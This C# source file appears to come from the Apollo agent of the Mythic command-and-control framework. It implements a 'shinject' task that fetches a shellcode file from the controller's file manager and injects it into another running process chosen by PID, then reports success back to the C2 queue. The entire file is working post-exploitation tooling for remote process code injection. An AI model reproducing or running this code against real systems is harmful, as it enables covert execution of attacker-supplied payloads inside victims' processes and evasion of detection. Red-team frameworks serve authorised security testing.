#define COMMAND_NAME_UPPER

#if DEBUG
#define SHINJECT
#endif

#if SHINJECT

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class shinject : Tasking
    {
        [DataContract]
        internal struct ShinjectArguments
        {
            [DataMember(Name = "pid")]
            public int PID;
            [DataMember(Name = "shellcode-file-id")]
            public string Shellcode;
        }
        public shinject(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }


        public override void Start()
        {
            TaskResponse resp;
            ShinjectArguments args = _jsonSerializer.Deserialize<ShinjectArguments>(_data.Parameters);
            System.Diagnostics.Process proc = null;
            try
            {
                proc = System.Diagnostics.Process.GetProcessById(args.PID);
            }
            catch
            {
            }

            if (proc != null)
            {
                if (_agent.GetFileManager().GetFile(
                        _cancellationToken.Token,
                        _data.ID,
                        args.Shellcode, out byte[] code))
                {
                    var technique = _agent.GetInjectionManager().CreateInstance(code, args.PID);
                    if (technique.Inject())
                    {
                        resp = CreateTaskResponse(
                            $"Injected code into {proc.ProcessName} ({proc.Id})", true, "completed",
                            new IMythicMessage[]
                            {
                                Artifact.ProcessInject(proc.Id, technique.GetType().Name)
                            });
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Failed to inject code into {proc.ProcessName} ({proc.Id}): {Marshal.GetLastWin32Error()}",
                            true,
                            "error");
                    }
                }
                else
                {
                    resp = CreateTaskResponse("Failed to fetch file.", true, "error");
                }
            }
            else
            {
                resp = CreateTaskResponse($"No process with ID {args.PID} running.", true, "error");
            }

            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif